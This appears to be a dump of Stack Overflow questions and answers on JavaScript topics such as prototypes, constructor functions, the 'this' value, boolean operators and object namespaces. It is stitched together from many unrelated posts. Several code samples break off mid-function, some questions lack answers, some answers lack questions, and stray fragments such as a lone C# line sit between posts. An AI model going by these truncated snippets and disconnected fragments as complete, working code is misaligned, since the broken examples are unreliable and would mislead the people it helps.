Person.prototype.walk = function () {
  // walk logic
};
</code></pre>

<p>The difference between <code>run</code> and <code>walk</code> is that the first will exist on every object instance of <code>Person</code>, and the second method, <code>walk</code>, will exist only in <code>Person.prototype</code> and will be accessed through the prototype chain.</p>

<p>In this pattern you see a bit of code duplication, we need the logic to initialize the fields also on the inherited constructor, another pattern that avoids this, is Constructor Function application:</p>

<pre><code>function Mankind (name, lastname) {
  this.name = name;
  this.lastname = lastname;
}

function Person (name, lastname) {
  Mankind.apply(this, arguments);
  this.run = function() {
    // run logic
  };
}

I have never used javascript enough to understand it and this particular request is really particular I have been looking for an explaination of similar code for over 8 hours.</p>

<p>If I have the follow variable declared:</p>

<pre><code>var types = {
    ""sugar"" : { ""color"" : ""blue"", ""weight"" : 1200, ""decoration"" : ""frosting""},
    ""chocolate chip"" : { ""color"" : ""brown"", ""weight"" : 12, ""chocolateType"" : ""milk""}

<p>How would I write to a cookie the properties of any type sent to the function, given it was actually declared.  Would I be correct that the <strong>this</strong> in the getweight function is the types variable?</p>

CookieBase.prototype.getWeight = function() { return this.weight; };

var CookieFactory = function(){
    var types = {
        ""sugar"" : { ""color"" : ""blue"", ""weight"" : 1200, ""decoration"" : ""frosting""},
        ""chocolate chip"" : { ""color"" : ""brown"", ""weight"" : 12, ""chocolateType"" : ""milk""}
    };

}();
</code></pre>

<p>I am not looking for the code itself I would really like somebody to explain the concept to me.  This is for a screening process for a job, so I want to give them my own code, but I am not familar with this concept.</p>

<p>Here is the question and what they want exactly:</p>

<blockquote>
  <p>In CookieFactory implement a public method named bakeCookie that takes a single parameter -- type. This method should create a cookie base instance with properties of the requested cookie type appended to it. If the type cannot be created return null. This code should not be more than about 10 lines long.</p>

<pre><code>// assuming that the CookieBase constructor is declared
var CookieFactory = (function () {
  var types = {
    ""sugar"" : {""color"" : ""blue"", ""weight"" : 1200, ""decoration"" : ""frosting""},
    ""chocolate chip"" : {""color"" : ""brown"", ""weight"" : 12,
                        ""chocolateType"" : ""milk""}
  }; 

  return { // public interface
    bakeCookie: function(type){
      var cookie = new CookieBase(),
          cookieType = types[type];

      if (!cookieType) return null; // no type found, return null

      for(var prop in cookieType) 
        if (cookieType.hasOwnProperty(prop))
          cookie[prop] = cookieType[prop];

      return cookie;
    }
  };
})();

var myCookie = CookieFactory.bakeCookie('sugar');
// Object color=blue weight=1200 decoration=frosting
alert(myCookie.getWeight()); // 1200
</code></pre>

<p>As you notice the <code>bakeCookie</code> method will create a <code>CookieBase</code> object, and it will <em>copy</em> the properties of the object argument passed to it.</p>

<p>Since the object returned was created with the <code>CookieBase</code> constructor, you can access all the properties declared in the <code>CookieBase.prototype</code> on that returned object.</p>

"<p>I understand <a href=""http://stackoverflow.com/questions/1406604/what-does-the-operator-double-exclamation-point-mean-in-javascript"">what the double not operator does in javascript</a>. I'm curious about it's use though and whether or not a recent assertion that I made is correct.</p>

<p>I said that <code>if (!!someVar)</code> is never meaningful nor is <code>(!!someVar &amp;&amp; ...</code> because both the <code>if</code> and the <code>&amp;&amp;</code> will cause someVar to be evaluated as a boolean so the !! is superfluous.</p>

<p>In fact, the only time that I could think of that it would be legitimate to use the double not operator is if you wanted to do a strict comparison to another boolean value (so maybe in return value that expects true or false explicitly).</p>

<p>Is this correct? I started to doubt myself when I noticed jQuery 1.3.2 used both <code>if (!!someVar)</code> and <code>return !!someVar &amp;&amp; ...</code> </p>

<p>Does the double not have any actual effect in these situations? </p>

<p>My personal opinion is that it just leads to confusion. If I see an if statement, I know it's evaluating it as a boolean.</p>
","5445","","<p>In the context of <a href=""http://bclary.com/2004/11/07/#a-12.5""><code>if</code> statements</a> I'm with you, it is completely safe because internally, the <code>ToBoolean</code> operation will be executed on the condition expression (<em>see Step 3 on the spec</em>).</p>

<p>But if you want to, lets say, return a boolean value from a function, you should ensure that the result will be actually boolean, for example:</p>

<pre><code>function isFoo () {
  return 0 &amp;&amp; true;
}

console.log(isFoo()); // will show zero
typeof isFoo() == ""number"";
</code></pre>

<p>In conclusion, the <a href=""http://bclary.com/2004/11/07/#a-11.11"">Boolean Logical Operators</a> <strong>can return an operand</strong>, and not a <code>Boolean</code> result necessarily:</p>

<p>The Logical AND operator (<code>&amp;&amp;</code>), will return the value of the <em>second operand</em> if the first is <em>truly</em>:</p>

<pre><code>true &amp;&amp; ""foo""; // ""foo""
</code></pre>

<p>And it will return the value of the <em>first operand</em> if it is by itself <em>falsy</em>:</p>

<pre><code>NaN &amp;&amp; ""anything""; // NaN
0 &amp;&amp; ""anything""; // 0
</code></pre>

<p>On the other hand, the Logical OR operator (<code>||</code>) will return the value of the <em>second operand</em>, if the first one is <em>falsy</em>:</p>

<pre><code>false || ""bar""; // ""bar""
</code></pre>

<p>And it will return the value of the <em>first operand</em> if it is by itself non-falsy:</p>

<pre><code>""foo"" || ""anything""; // ""foo""
</code></pre>

<p>Maybe it's worth mentioning that the <em>falsy</em> values are: <code>null</code>, <code>undefined</code>, <code>NaN</code>, <code>0</code>, zero-length string, and of course <code>false</code>.</p>

<p>Anything else (that is not <em>falsy</em>, a <code>Boolean</code> object or a <code>Boolean</code> value), evaluated in <a href=""http://bclary.com/2004/11/07/#a-9.2""><em>boolean context</em></a>, will return <code>true</code>.</p>

"<p>I fear I may be losing my marbles today, because I don't know how to do what I want to. I want a custom prompt that I can call from any of my other JavaScript functions. I don't know how to get this work, even though it <em>feels</em> like I've done it a hundred times.</p>

<p>Here is an example</p>

<pre><code>var modal = function() {

    var prompt = function(msg) {
        // custom prompt builder here... let's return hard coded for example's sake
        return true;
    };

}();

var items = function() {
    var init = function() {

        $('.delete').click(function() {
            var confirm = modal.prompt('Are you sure you wanna delete that pal?');
        });

    };    


    $(document).ready(init);    
}();
</code></pre>

<p>What I want to be able to do is call the prompt method of modal, and get a return value based on the user input. Now this, I can do, but I am having problems calling the inner method. I want to group these together because I will probably have a custom modal <code>alert()</code> too.</p>

<p>Please don't suggest the built in JavaScript OK/Cancel as I gotta do this custom.</p>

<p>Many thanks!</p>
","5445","","<p>For your first issue, the <code>prompt</code> function, is declared as a variable within your <code>modal</code> object, you can't access it because you aren't actually exposing it publicly:</p>

<pre><code>var modal = (function() {
  var privateMethod1 = function () {/*...*/},
      privateVar = 'foo';

  function privateMethod2() {
    //...
  }

  return { // public members
    prompt: function (msg) {
      // custom prompt builder here... let's return hard coded for example's sake
      return true;
    }
  };
})();

<p>Now for the following issue:</p>

<blockquote>
  <p>What I want to be able to do is call the prompt method of modal, and get a return value based on the user input.</p>
</blockquote>

<p>The user input is an asynchronous action, I would recommend you to use a callback based model, the built-in  JavaScript OK/Cancel <code>window.prompt</code> can actually return a value, because it <strong>stops the code execution</strong> and waits for the user input.</p>

<pre><code>var modal = (function() {
    return {
      prompt: function(msg, okCallback, cancelCallback) {
        // ...

        $('#okButton').click(function () {
          // internal actions here, like closing the dialog, cleanup, etc...
          okCallback(); // execute the ok callback
        });

        $('#cancelButton').click(function () {
          // ...
          cancelCallback(); // execute the cancel callback
        });

","5445","","<p>You could use a <em>dummy</em> DOM element, set the description as the <code>innerHTML</code> and later get its <code>textContent</code>, that will take out all the tags, and it will handle all the HTML Entities like <code>&amp;nbsp;</code>:</p>

<pre><code>function getInfo(description) {
  var tmp = document.createElement('div');
  tmp.innerHTML = description;

"<p>I'm creating a control for Google maps v2. While creating my control I've found a design challenge and want to find an appropriate solution. Here's the goods.</p>

<p>A custom Google control inherits from GControl;</p>

<pre><code>myControl.prototype = new GControl();
</code></pre>

<p>Next I need to overload the initializer so here it is.</p>

<pre><code> myControl.prototype.initilize = function (map) { 
    //do some work and return stuff

 };
</code></pre>

<p>Now within my custom controls initlize function I create a couple elements which, using the GEvent class, I subscribe to various events. To make my callback functions managable, I included them into the controls prototype.</p>

<pre><code>myControl.prototype.onEvent = function(e){
  //do some work;
  //modify the members of the current myControl instance
};
</code></pre>

<p>Within my callback function ""onEvent"" I want to modify members within my control. <strong>What is the best way to access my control from the function?</strong> The keyword ""this"" cannot be used because that is a reference to the element that was clicked, in my case a div. And I can't access the members through the prototype because I need a specific instance of the object. The only viable solution I've considered is to create my control globally in one of my scripts. Is this the best method?</p>
","5445","","<p>The easiest thing that I can think, it to define your <code>onEvent</code> method within your constructor, there you will have quick access to the current object instance, and you will not have to modify your public API:</p>

<pre><code>function MyControl () {
  var instance = this; // store a reference to 'this'

  this.onEvent = function (e) {
    // use the instance variable
    instance.otherMethod();
  };
}
</code></pre>

<p>Note that in this approach, the <code>onEvent</code> property will exist physically in your object instances (<code>obj.hasOwnProperty('onEvent') = true</code>).</p>

<p><strong>Edit:</strong> You can simply use the <a href=""http://code.google.com/apis/maps/documentation/events.html#Event_Bindings"" rel=""nofollow""><code>GEvent.bind</code></a> function:</p>

<pre><code>GEvent.bind(map, ""click"", myObj, myObj.onEvent);
</code></pre>

<p>The above <code>bind</code> method will enforce the context, so the <code>this</code> keyword inside <code>myObj.onEvent</code> will point to the <code>myObj</code> object instance when the event is triggered, it will work with your code without problems.</p>

","5445","","<p>I would recommend you the first one, that convention is widely used in JavaScript, even in the core language by itself, the <a href=""http://bclary.com/2004/11/07/"">ECMA Specification</a> uses it, e.g. </p>

<pre><code>Array.prototype.toLocaleString
Object.prototype.hasOwnProperty
Object.prototype.propertyIsEnumerable

","5445","","<p>JavaScript doesn't support what you would call in other languages <em>method overloading</em>, but there are multiple workarounds, like using the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Functions/arguments""><code>arguments</code></a> object, to check with how many arguments a function has been invoked:</p>

<pre><code>function f1(a, b, c) {
  if (arguments.length == 2) {
    // f1 called with two arguments
  } else if (arguments.length == 3) {
    // f1 called with three arguments

<p>Additionally you could type-check your arguments, for Number and String <em>primitives</em> is safe to use the <code>typeof</code> operator:</p>

<pre><code>function f1(a, b, c) {
  if (typeof a == 'number' &amp;&amp; typeof b == 'number') {

var height = Number(form.height.value); // or
var height = parseFloat(form.height.value);

<li><p>You should declare your variables with the <code>var</code> statement, otherwise if they aren't found in the current scope, they will become <strong>global</strong> variables. e.g.:</p>

<pre><code>//...
var total = (photos * 4.95) + PriceSix;

"<p>I often find myself using inline initialization (see example below), especially in a switch statement when I don't know which case loop will hit. I find it easier to read than if statements.</p>

<p>But is this good practice or will it incur side-effects or a performance hit?</p>

<pre><code>for (var i in array) {
    var o = o ? o : {};  // init object if it doesn't exist
    o[array[i]] = 1;     // add key-values

<pre><code>//...
var obj = o || {};
</code></pre>

<p>This operator will return its second operand if the first one evaluates to <code>false</code>, otherwise it will return the first one.</p>

<p>Is safe to use it when you expect an object, since those <em>falsy</em> values are <code>null</code>, <code>undefined</code>, <code>NaN</code>, <code>0</code>, a zero-length string, and of course <code>false</code>.</p>

<p>I find it useful to set <em>default values</em> on function arguments, when of course any of the <em>falsy</em> values are expected as valid by the function:</p>

<pre><code>function test (arg1) {
  arg1 = arg1 || ""default value"";

<p>Another example, the expression:</p>

<pre><code>int? a = null;

<p>I will describe it in comments then just give the code, since the comments may be more clear and simple than the code:</p>

<ul>
<li>// set up a function call on keypress.</li>
<li>// function call has a delay before the main event occurs. </li>
<li>// When keypress function is called, wipe any previously queued events and make a new one at the standard delay rate.</li>
<li>// Use a global to store the setTimeout pointer.</li>
<li>// clearTimeout any pre-existing pointers.</li>
<li>// Start a new delay.</li>

                $('#supplier-select-filter').keypress(function (){
                    // Currently, resets a delay on an eventual filtering action every keypress.
                    filterSuppliers(.3, this);
                });

                // Delayed filter that kills all previous filter request.
                function filterSuppliers(delay, inputbox){
                    if(undefined != typeof(document.global_filter_trigger)){
                        clearTimeout(document.global_filter_trigger);

                    // Use a global to store the setTimeout pointer.
                    document.global_filter_trigger = setTimeout(function (){

<p>.load() is simpler than taking in JSON and then generating html from the json, but maybe there is a better tool?</p>

","5445","","<p>Well, the prototype link between objects (<code>[[Prototype]]</code>) is internal, some implementations, like the Mozilla, expose it as <code>obj.__proto__</code>.</p>

<p>Give a look to this <a href=""http://ejohn.org/blog/objectgetprototypeof/"" rel=""nofollow"">implementation</a> by John Resig, it has a pitfall, it relies on the <code>constructor</code> property of engines that don't support <code>__proto__</code>:</p>

<pre><code>if ( typeof Object.getPrototypeOf !== ""function"" ) {
  if ( typeof ""test"".__proto__ === ""object"" ) {
    Object.getPrototypeOf = function(object){

  } else {
    Object.getPrototypeOf = function(object){
      // May break if the constructor has been tampered with
      return object.constructor.prototype;
    };
  }

<p>Thanks!</p>
","5445","","<p>You should use the <code>prototype</code> property only on <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Creating_New_Objects/Using_a_Constructor_Function""><em>Constructor Functions</em></a>, not in <em>object instances</em>, for example:</p>

<pre><code>function Test () {}
Test.prototype.method1 = function () {/*...*/};

var obj = new Test();
</code></pre>

<p>The <code>prototype</code> property of constructor functions, is used by the <code>new</code> operator, when it creates our new object instance.</p>

<p>All native objects have a hidden link, that builds up the prototype chain.</p>

<p>This hidden link between objects is the <code>[[Prototype]]</code> internal property, and the <code>new</code> operator is the only one that can set it.</p>

<p>In the above example, the <code>obj</code> is associated internally with it's constructor prototype, the <code>method1</code> is accessible from <code>obj</code>, but it doesn't exists physically on this object, that method exists on the <code>Test.prototype</code> object, and it's retrieved through the <em>prototype chain</em>, e.g.:</p>

<pre><code>typeof obj.method1; // ""function""
obj.hasOwnProperty('method1'); // false
obj.method1 === Test.prototype.method1; // true

<p>On object instances, assigning a <code>prototype</code> property is meaningless, it will be taken just as any other property name:</p>

myObject.prototype = ""foo"";
myObject.bar = ""bar"";

// myObject is simply {""prototype"":""foo"",""bar"":""bar""}
</code></pre>
"
"<p>My colleague has been using ""new function()"" with a lower case ""f"" to define new objects in JavaScript.  It seems to work well in all major browsers and it also seems to be fairly effective at hiding private variables.  Here's an example:</p>

<pre><code>    var someObj = new function () {
        var inner = 'some value';
        this.foo = 'blah';

        this.get_inner = function () {
            return inner;
        };

        this.set_inner = function (s) {
            inner = s;
        };
    };
</code></pre>

<p>As soon as ""this"" is used, it becomes a public property of someObj.  So someObj.foo, someObj.get_inner() and someObj.set_inner() are all available publicly.  In addition, set_inner() and get_inner() are privileged methods, so they have access to ""inner"" through closures.</p>

<p>However, I haven't seen any reference to this technique anywhere.  Even Douglas Crockford's JSLint complains about it:</p>

<blockquote>
  <ul>
  <li>weird construction. Delete 'new'</li>
  </ul>
</blockquote>

<p>We're using this technique in production and it seems to be working well, but I'm a bit anxious about it because it's not documented anywhere.  Does anyone know if this is a valid technique?</p>
","5445","","<p>I've seen that technique before, it's valid, you are using a function expression as if it were a <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function"">Constructor Function</a>.</p>

<p>But IMHO, you can achieve the same with an auto-invoking function expression, I don't really see the point of using the <code>new</code> operator in that way:</p>

<pre><code>var someObj = (function () {
    var instance = {},
        inner = 'some value';

    instance.foo = 'blah';

    instance.get_inner = function () {
        return inner;
    };

    instance.set_inner = function (s) {
        inner = s;
    };

    return instance;
})();
</code></pre>

<p>The purpose of the <code>new</code> operator is to create new object instances, setting up the <code>[[Prototype]]</code> internal property, you can see how this is made by the <a href=""http://bclary.com/2004/11/07/#a-13.2.2""><code>[Construct]</code></a> internal property.</p>

<p>The above code will produce an equivalent result.</p>
"
"<p>In PHP you can do <code>if(isset($array['foo'])) { ... }</code>. In Javascript you often use <code>if(array.foo) { ... }</code> to do the same, but this is not exactly the same statement. The condition will also evaluate to false if <code>array.foo</code> does exists but is <code>null</code> or <code>false</code> (and probably other values as well).</p>

<p>What is the perfect equivalent of PHP's <code>isset</code> in Javascript?</p>

<p>In a broader sense, a general, complete guide on Javascript's handling of variables that don't exist, variables without a value, etc. would be convenient. </p>
","5445","","<p>I generally use the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Operators/typeof""><code>typeof</code></a> operator:</p>

<pre><code>if (typeof obj.foo != 'undefined') {
  // ..
}
</code></pre>

<p>It will return <code>""undefined""</code> either if the property doesn't exist or it's value is <code>undefined</code>.</p>

<p><sub>(See also: <a href=""http://stackoverflow.com/questions/3420071/difference-between-undefined-and-not-being-defined-in-javascript/3420160#3420160"">Difference between <code>undefined</code> and not being defined.</a>)</sub></p>

<p>There are other ways to figure out if a property exists on an object, like the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/HasOwnProperty""><code>hasOwnProperty</code></a> method:</p>

<pre><code>if (obj.hasOwnProperty('foo')) {
  //..
}
</code></pre>

<p>And the <code>in</code> operator:</p>

<pre><code>if ('foo' in obj) {
  //..
}
</code></pre>

<p>The difference between the last two, is that the <code>hasOwnProperty</code> method, will check if the property exist <em>physically</em> on the object (the property is not inherited).</p>

<p>The <code>in</code> operator will check on all the properties reachable up in the prototype chain, e.g.:</p>

<pre><code>var obj = { foo: 'bar'};

obj.hasOwnProperty('foo'); // true
obj.hasOwnProperty('toString'); // false
'toString' in obj; // true
</code></pre>

<p>As you can see, <code>hasOwnProperty</code> returns <code>false</code> and the <code>in</code> operator returns <code>true</code> when checking the <code>toString</code> method, this method is defined up in the prototype chain, because <code>obj</code> inherits form <code>Object.prototype</code>.</p>

","5445","","<p>Your first example is the faster because it only involves the check of the <code>id</code> attribute, on all the <code>input</code> elements.</p>

"<p>I wrote a tab system using some very basic Javascript and it runs like a champ in IE 8 but, in FireFox 3 I am coming up short.  The pertitent HTML is as follows:</p>

<pre><code>            &lt;div id=""tabs""&gt;
                &lt;ul class=""tabs""&gt;
                    &lt;li class=""current""&gt;&lt;a&gt;&lt;span&gt;News&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                    &lt;li&gt;&lt;a&gt;&lt;span&gt;Videos&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                    &lt;li&gt;&lt;a&gt;&lt;span&gt;Photos&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                    &lt;li&gt;&lt;a&gt;&lt;span&gt;Twitter&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
</code></pre>

<p>Then, on page load, I get dropped into this method:</p>

<pre><code>function processTabs(TabContainer, PageContainer, Index) {
var tabContainer = document.getElementById(TabContainer);
var tabs = tabContainer.firstChild;

var tab = tabs.firstChild;
var i = 0;
.... more code }
</code></pre>

<p>The rest of the code does not matter at this point because it never gets called.  tabContainer is set properly to reference the div with the ID tabs. Now, in Internet Explorer when I call tabContainer.firstChild the variable 'tabs' is referencing my UL and then the call var tab = tabs.firstChild; references my first LI.   The problem is that when I call tabContainer.firstChild Venkman is telling me it is returning .  So firefox is reading my newlines as actual children inside the div's! My UL is actually the second child in the childNodes collection!</p>

<p>Is there any way to fix this?</p>

<p>Thanks!</p>

<p>This gives no syntax or runtime error. Looks like number and variable name can be any other (<code>123..qwerty</code>).  I'm wondering what does this statement mean?</p>
","5445","","<p>Is <strong>not</strong> a range, the <code>1..z</code> expression will simply return <code>undefined</code>.</p>

<p>Why? </p>

<p>The first dot ends a representation of a <a href=""http://bclary.com/2004/11/07/#a-7.8.3"">Numeric Literal</a>, giving you a <code>Number</code> primitive:</p>

<p>The grammar of a Numeric Literal is expressed like this:</p>

<pre><code>DecimalIntegerLiteral . DecimalDigitsopt ExponentPartopt

<p>As you can see the DecimalDigits part after the dot is <em>optional</em> (opt suffix).</p>

<p>The second dot is the property accessor, it will try only to get the <code>z</code> property, which is <code>undefined</code> because it doesn't exist on the <code>Number.prototype</code> object:</p>

<pre><code>1..z; // undefined
1..toString(); // ""1""

","5445","","<p>That wouldn't work, first because the <a href=""http://bclary.com/2004/11/07/#a-10.1.7""><code>this</code></a> value associated with an execution context is <em>immutable</em>.</p>

<p>You might now think that deleting <code>myObject</code> (by <code>delete myObject;</code>) might work, but that wouldn't do it either.</p>

<p>Variables are really properties of the <em>Variable Object</em>, this object is not accessible by code, it is just in front of in the <em>scope chain</em>, where you do the variable declarations.</p>

<p>The Variable statement, creates those properties with the <code>{ DontDelete }</code> attribute, and that causes the <code>delete</code> operator to fail.</p>

<p>An option if you want to achieve this is to <em>nullify</em> your <code>myObject</code> instance, but that doesn't guarantees that another reference is still pointing to that object.</p>

"<p>I'm trying to write a function that takes a string representing a namespace (e.g. ""MyCompany.UI.LoginPage"") and defines each segment of the namespace as an object if it doesn't already exist. For example, if ""MyCompany.UI.LoginPage"" wasn't an object, it would evaluate this:</p>

<pre><code>MyCompany = {};
MyCompany.UI = {};
MyCompany.UI.LoginPage = {};
</code></pre>

<p>I would like to do this by enumerating each character of the ""namespace"" (string) argument and defining each object as the enumeration reaches period characters. </p>

<p>How can I enumerate the characters of a string in JavaScript? </p>
","5445","","<p>You can access the characters of a string directly by its index, using the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/String/charAt"" rel=""nofollow""><code>String.prototype.charAt</code></a> method:</p>

<pre><code>var str = ""foo"";
for (var i = 0; i &lt; str.length; i++) {
  alert(str.charAt(i));
}
</code></pre>

<p>But I don't think that you want to traverse your <em>namespace string</em> character by character, you can use the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/String/split"" rel=""nofollow""><code>String.prototype.split</code></a> method, to get an array containing the <em>namespace levels</em> using the dot (<code>.</code>) character as a separator, e.g.:</p>

<pre><code>var levels = ""MyCompany.UI.LoginPage"".split('.');
// levels is an array: [""MyCompany"", ""UI"", ""LoginPage""]
</code></pre>

<p>But I think your question goes <em>further</em> to this, and I will give you a more advanced starting point, I made a recursive function that will allow you to do exactly what you want, initialize several nested object levels using a string:</p>

<p><strong>Usage:</strong></p>

<pre><code>initializeNS('MyCompany.UI.LoginPage');
// that will create a MyCompany global object

// you can use it on an object to avoid globals also
var topLevel = {};
initializeNS('Foo.Bar.Baz', topLevel);

// or
var One = initializeNS('Two.Three.Four', {});
</code></pre>

<p><strong>Implementation:</strong></p>

<pre><code>function initializeNS(ns, obj) {
  var global = (function () { return this;})(), // reference to the global object
      levels = ns.split('.'), first = levels.shift();
  obj = obj || global; //if no object argument supplied declare a global property
  obj[first] = obj[first] || {}; // initialize the ""level""
  if (levels.length) { // recursion condition
    initializeNS(levels.join('.'), obj[first]);
  }
  return obj[first]; // return a reference to the top level object
}

<p>You will have to improve this function, for example you will need to sanitize the string...</p>

","5445","","<p>Well, returning <code>this</code> from a <em>standalone function</em> is not much useful, I think it will be useful for you to know how the <code>this</code> value works:</p>

<p>The <code>this</code> value is <em>implicitly</em> set when:</p>

<ol>
<li><p>When a function is called as a method (the function is invoked as member of an object):</p>

<pre><code>obj.method(); // 'this' inside method will refer to obj
</code></pre></li>
<li><p>A normal function call:</p>

<pre><code>myFunction(); // 'this' inside the function will refer to the Global object
// or 
var global = (function () { return this; })();
</code></pre></li>
<li><p>When the new operator is used:</p>

<pre><code>var obj = new MyObj(); // this will refer to a newly created object.
</code></pre></li>
</ol>

<p>And you can also set the this keyword <em>explicitly</em>, with the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/call"" rel=""nofollow""><code>call</code></a> and <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/apply"" rel=""nofollow""><code>apply</code></a> methods:</p>

<pre><code>function test () {
  alert(this);
}

test.call(""Hello world"");
</code></pre>

<p>As you can see, if you make a function call in no-object context (like example 2), the <code>this</code> value will refer to the Global object, which is not so much useful, unless you are looking for that.</p>

<p>When using function as methods, in <em>object context</em> returning this allows to build patterns of <em>method chaining</em> or <em>fluent interfaces</em>.</p>

<p>On <a href=""https://developer.mozilla.org/es/Core_JavaScript_1.5_Guide/Creating_New_Objects/Using_a_Constructor_Function"" rel=""nofollow"">constructor functions</a>, <code>this</code> is the <em>default</em> return value, if you don't return any other object or you don't even have a <code>return</code> statement on your function, <code>this</code> will be returned.</p>

","5445","","<p>In the current widely available implementation, <a href=""http://bclary.com/2004/11/07/"">ECMAScript 3</a> there is no support for real <em>immutability</em>.</p>

"<p>I am trying to get a JavaScript object to use the ""this"" assignments of another objects' constructor, as well as assume all that objects' prototype functions. Here's an example of what I'm attempting to accomplish:</p>

<pre><code> /* The base - contains assignments to 'this', and prototype functions
  */
 function ObjX(a,b) {
     this.$a = a;
     this.$b = b;
 }

 ObjX.prototype.getB() {
     return this.$b;
 }

 function ObjY(a,b,c) {
    // here's what I'm thinking should work:
    this = ObjX(a, b * 12); 
    /* and by 'work' I mean ObjY should have the following properties:
     * ObjY.$a == a, ObjY.$b == b * 12,
     * and ObjY.getB == ObjX.prototype.getB
     * ... unfortunately I get the error: 
     *     Uncaught ReferenceError: Invalid left-hand side in assignment
     */

    this.$c = c; // just to further distinguish ObjY from ObjX.
 }
</code></pre>

<p>I'd be grateful for your thoughts on how to have ObjY subsume ObjX's assignments to 'this' (i.e. not have to repeat all the <code>this.$* = *</code> assignments in ObjY's constructor) and have ObjY assume ObjX.prototype.</p>

<p>My first thought is to try the following:</p>

<pre><code>function ObjY(a,b,c) {
   this.prototype = new ObjX(a,b*12);
}
</code></pre>

<p>Ideally I'd like to learn how to do this in a prototypal way (i.e. not have to use any of those 'classic' OOP substitutes like <a href=""http://code.google.com/p/base2/"" rel=""nofollow"">Base2</a>).</p>

<p>It may be noteworthy that ObjY will be anonymous (e.g. <code>factory['ObjX'] = function(a,b,c) { this = ObjX(a,b*12); ... }</code>) -- if I've the terminology right.</p>

<p>Thank you.</p>
","5445","","<p>You can't really do that, because the <a href=""http://bclary.com/2004/11/07/#a-10.1.7""><code>this</code></a> value by definition is <em>immutable</em>, you can't change in that way what it references to.</p>

<p>A workaround would be to use the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/call""><code>call</code></a> or <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/apply""><code>apply</code></a> methods to run your <code>ObjX</code> constructor function in the <code>this</code> object of <code>ObjY</code>:</p>

<pre><code>function ObjY(a,b,c) {
  ObjX.call(this, a, b * 12); 
  this.$c = c;
}
</code></pre>

<p>In the above example, the <code>ObjX</code> function is executed changing its <code>this</code> value, so all property extensions you make to that object in this function, will be reflected in the new object that the <code>this</code> value refers in the <code>ObjY</code> constructor.</p>

<p>As soon the <code>call</code> method ends, the <code>this</code> object will be augmented and you can make more property extensions, like adding your <code>$c</code> value.</p>

<p><strong>Edit:</strong> About the prototypes, your sample will not work, because the <code>prototype</code> property has no special meaning for object in stances it will be just as any other property, it should be used on <em>constructor functions</em>.</p>

<p>I think you might be confusing the <code>prototype</code> property of constructors with the internal <code>[[Prototype]]</code> property that all objects have.</p>

<p>The <code>[[Prototype]]</code> property can only be set by the <code>new</code> operator (through the <a href=""http://www.ecmascript.org/docs.php""><code>[[Construct]]</code></a> internal operation), this property can't be changed, (although some implementations, like the Mozilla one, you can access it through <code>obj.__proto__;</code>, and in <a href=""http://www.ecmascript.org/docs.php"">ECMAScript 5</a>, the <code>Object.getPrototypeOf</code> method has been introduced, but I wouldn't recommend you to mess directly with it).</p>

<p>Actually, when your constructor function is executed, the internal <code>[[Prototype]]</code> property of the object that the <code>this</code> value refers, has already been set to its constructor's <code>prototype</code> property.</p>

<p>So, as @Anurag comments, you could set the <code>ObjY.prototype</code> to a newly created <code>ObjX</code> object:</p>

<pre><code>function ObjY(a,b,c) {
  ObjX.call(this, a, b * 12); 
  this.$c = c;
}

ObjY.prototype = new ObjX();
ObjY.prototype.constructor = ObjY;
</code></pre>

<p>That will make that your <code>ObjY</code> inherit also the properties added to the <code>ObjX.prototype</code>, and as you see, I changed the <code>ObjY.prototype.constructor</code>, since the assignment in the line above will make this property to wrongly point to <code>ObjX</code>.</p>

What it lacks is some try-out code examples.

I personally find the explanations are not that easy as in the first link, but still very good.
The most difficult part even after I actually got it is really not to confuse the .prototype propery with the internal [[Prototype]] of an object.</p>
","5445","","<p>You get the first error (<em>mammal.prototype is undefined</em>) because <code>mammal</code> is an object, the <a href=""http://bclary.com/2004/11/07/#a-15.3.5.2"" rel=""nofollow""><code>prototype</code></a> property is added to function objects when they are <a href=""http://bclary.com/2004/11/07/#a-13.2"" rel=""nofollow"">created</a> and it should be used when you want to have functions as <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Creating_New_Objects/Using_a_Constructor_Function"" rel=""nofollow"">constructors</a>.</p>

<p>I think you are confusing that property with the internal <code>[[Prototype]]</code> property.</p>

<p>The <code>[[Prototype]]</code> property can only be set by the <code>new</code> operator, through the <a href=""http://bclary.com/2004/11/07/#a-13.2"" rel=""nofollow""><code>[[Construct]]</code></a> internal operation.</p>

<p>This property is not accessible, (although there are some ways, like in the Mozilla implementation by <code>obj.__proto__;</code> or the new ECMAScript 5 <code>Object.getPrototypeOf</code> method).</p>

<p>About your second question, you get those errors because you are creating a new object, that inherits from a function, not from another object.</p>

<p>What about :</p>

<pre><code>var mammal = {
  color: ""brown"",
  getColor: function(){
    return this.color;
  },
  kindOf: ""mammal"" // ""base"" value
};
// ...
var tiger = object(mammal);
tiger.roar = function(){return ""roar"";}
tiger.kindOf = ""predator""; // specific value
</code></pre>

<p>In the above snippet, all the instances that inherit from <code>mammal</code>, will have a <code>kindOf</code> property, that you can later change when you create more specific <em>mammal</em> objects.</p>

<p><strong>Edit:</strong> In response to your comment, yes, the language itself gives you the tool to know that, the <a href=""http://bclary.com/2004/11/07/#a-15.2.4.5"" rel=""nofollow""><code>Object.prototype.hasOwnProperty</code></a> method, it returns a boolean result, indicating whether the object has physically the specified property or not, e.g.:</p>

<pre><code>var obj = {
  foo: 'bar'
};

obj.hasOwnProperty('foo'); // true
obj.hasOwnProperty('toString'); // false, inherited from Object.prototype

<p>You can also call this method directly on the <code>Object.prototype</code>, so if someone names a property <code>hasOwnProperty</code> on an object, it won't fail:</p>

